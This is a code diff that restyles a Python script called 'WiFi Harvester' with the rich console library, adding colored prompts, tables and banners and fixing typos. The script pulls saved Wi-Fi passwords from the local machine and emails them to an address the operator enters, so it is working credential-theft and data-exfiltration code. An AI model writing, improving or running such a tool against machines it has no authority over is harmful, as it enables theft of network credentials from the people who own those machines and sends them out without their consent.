@@ -1,10 +1,16 @@
 import subprocess,smtplib,re 
 import os
+from rich.console import Console
+from rich.panel import Panel
+from rich.prompt import Prompt
+from rich.table import Table
+from rich import print as rprint
 
 #------------------------------------------------
 #Global variable
 #------------------------------------------------
 
+console = Console()
 file_path = "wlan_profiles"
 
 def get_arg():
@@ -12,31 +18,32 @@ def get_arg():
       pattern = r'^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$'
 
       while True:
-          senders_mail = input("Enter the senders Email_address: ")
+          senders_mail = Prompt.ask("[cyan]Enter the senders Email_address[/cyan]")
 
           if not re.fullmatch(pattern,senders_mail):
-              print()
-              print("[-] Inavlid, enter a proper Senders email address")
-              print()
+              console.print()
+              console.print("[bold red][-] Invalid, enter a proper Senders email address[/bold red]")
+              console.print()
           else:
               break
 
       while True:
-          reciving_mail = input("Enter the Reciving Email_address: ")
+          reciving_mail = Prompt.ask("[cyan]Enter the Receiving Email_address[/cyan]")
 
           if not re.fullmatch(pattern,reciving_mail):
-                        print()
-                        print("[-] Inavlid, enter a proper Reciving email address")
-                        print()
+              console.print()
+              console.print("[bold red][-] Invalid, enter a proper Receiving email address[/bold red]")
+              console.print()
           else:
-                break
+              break
+
       while True:
-          app_password = input("Enter the app password: ")
+          app_password = Prompt.ask("[cyan]Enter the app password[/cyan]", password=True)
 
           if not app_password:
-              print()
-              print("[-] Blank response. Kindly check how to get a app password")
-              print()
+              console.print()
+              console.print("[bold red][-] Blank response. Kindly check how to get an app password[/bold red]")
+              console.print()
           else:
               break
 
@@ -52,15 +59,15 @@ def send_mail(Senders_mail,reciving_mail,password,message):
 
     from email.mime.text import MIMEText
     msg = MIMEText(message,"plain","utf-8") #utf-8 the protocol on how we the encoding and decoding the message
-    msg["Subject"]  = "Passowrd" # headers 
-    msg["FROM"] = senders_mail
+    msg["Subject"]  = "Password" # headers 
+    msg["FROM"] = Senders_mail
     msg["TO"] = reciving_mail 
     server.sendmail(Senders_mail,reciving_mail,msg.as_string()) # as msg is a mime object and we r sending it in the form of string 
     server.quit()
 
-    print()
-    print(f"[*] Mail has been sent to {reciving_mail}")
-    print()
+    console.print()
+    console.print(f"[bold green][*] Mail has been sent to {reciving_mail}[/bold green]")
+    console.print()
 
 
 
@@ -72,9 +79,8 @@ def save_data():
    with open(file_path,"w")as f:
        for i in values:
           f.write(i)
-   print("-" * 30)       
-   print("[+] Data saved in file")
-   print("-" * 30)
+
+   console.print(Panel("[bold green][+] Data saved in file[/bold green]", style="green"))
 
    with open(file_path,"r",errors="ignore")as q:
       result = q.readlines()
@@ -95,21 +101,24 @@ def save_data():
 #function to show the profiles to the user to choose 
 
 def Show_profiles(profiles):
-   
-    print("*" * 50)
-    print("  Profiles avaliable in this computer")
-    print("*" * 50)
 
-    for number , profile in profiles.items():
-        print(f"{number}    {profile}")
+    # Rich table to display profiles
+    table = Table(title="Profiles Available in this Computer", style="cyan", header_style="bold magenta")
+    table.add_column("No.", style="yellow", justify="center")
+    table.add_column("Profile Name", style="white")
+
+    for number, profile in profiles.items():
+        table.add_row(str(number), profile)
+
+    console.print(table)
 
     choose_profile = " "
-    choice = int(input("Enter the profile number: "))
+    choice = int(Prompt.ask("[cyan]Enter the profile number[/cyan]"))
     if choice in profiles:
         choose_profile = profiles[choice]
-        print("*" * 50)
+        console.print(f"[bold green][+] Selected: {choose_profile}[/bold green]")
     else:
-         print(f"[-] Invalid choice of: {choice}")
+         console.print(f"[bold red][-] Invalid choice of: {choice}[/bold red]")
          exit(1)
     
 
@@ -124,7 +133,7 @@ def print_choosen_profile_details(profile_name):
 
     password = re.search(r"(?:Content\s*:\s)(.*)", result)
     if not password:
-        print(f"[-] No password found for this profile name: {profile_name}")
+        console.print(f"[bold red][-] No password found for this profile name: {profile_name}[/bold red]")
         exit(0)
     
     passs = f"Password for the profile {profile_name} is {password.group(1)}"
@@ -154,16 +163,21 @@ def password_for_all_the_profiles(profiles):
     return message
         
 
+# Banner
+console.print(Panel.fit("[bold cyan]WiFi Harvester[/bold cyan]\n[dim]Extract saved WiFi passwords and send via email[/dim]", border_style="cyan"))
+console.print()
+
 senders_mail , reciving_mail , app_password = get_arg()    
 profiles = save_data()
 
-print("Do u want to scan a particular profile or everything?")
-choice = input("choose 1 for 'particular profile' scan (1),  choose 2 for everything (2): ")
+console.print()
+console.print(Panel("[yellow]Do you want to scan a particular profile or everything?[/yellow]", style="yellow"))
+choice = Prompt.ask("[cyan]Choose[/cyan]", choices=["1", "2"], default="1")
 
 if choice == "1":
    profile_name = Show_profiles(profiles)
    password = print_choosen_profile_details(profile_name)
    send_mail(senders_mail,reciving_mail,app_password,password)
 elif choice == "2":
-    profile_password =password_for_all_the_profiles(profiles)
+    profile_password = password_for_all_the_profiles(profiles)
     send_mail(senders_mail,reciving_mail,app_password,profile_password)
